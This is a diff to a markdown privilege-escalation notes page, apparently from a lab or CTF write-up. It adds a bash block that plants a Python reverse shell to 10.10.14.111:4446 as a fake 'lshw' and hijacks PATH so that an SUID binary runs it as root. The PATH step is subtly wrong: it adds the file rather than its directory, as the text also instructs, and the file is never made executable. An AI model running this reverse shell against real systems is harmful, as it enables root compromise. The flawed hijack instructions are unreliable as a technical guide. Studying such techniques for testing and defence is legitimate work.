@@ -83,9 +83,11 @@ Write your public key to `~/.ssh/authorized-keys` and connect by ssh:
 ## Trick program that calls other through PATH
 (magic) Through SUID check we notice that the user can execute /bin/sysinfo as root. As sysinfo calls lshw, we create another file called lshw that reverse shells to us, and add the path of our malicious lshw to the beginning of the PATH (add the full one, including the file name).
 
+```bash
 echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.111\",4446));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > /tmp/lshw
 
 export PATH=/tmp/lshw:$PATH
+```
 
 ## Resources
 [Linux Privilege Escalation - Tradecraft Security Weekly #22](https://www.youtube.com/watch?v=oYHAi0cgur4)
